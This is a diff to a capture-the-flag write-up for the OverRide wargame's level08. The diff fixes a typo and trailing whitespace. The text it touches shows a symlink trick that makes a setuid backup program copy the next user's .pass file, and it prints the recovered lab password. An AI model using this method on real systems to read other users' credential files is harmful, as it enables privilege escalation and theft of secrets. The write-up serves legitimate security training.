@@ -5,7 +5,7 @@ The program seems to open a file a create a back up of the file given as argumen
 
 ### Analysis
 
-Since we can make a backup of file and the rogram is made by **level09**, we want to generate a back up of `/home/users/level09/.pass`.
+Since we can make a backup of file and the program is made by **level09**, we want to generate a back up of `/home/users/level09/.pass`.
 
 ### Progress
 
@@ -16,7 +16,7 @@ So we decided to try a symlink with the file we want to open and put it into our
 ```sh
 level08@OverRide:~$ ln -s /home/users/level09/.pass .file
 level08@OverRide:~$ ./level08 .file
-level08@OverRide:~$ cat backups/.file 
+level08@OverRide:~$ cat backups/.file
 fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
 ```
 
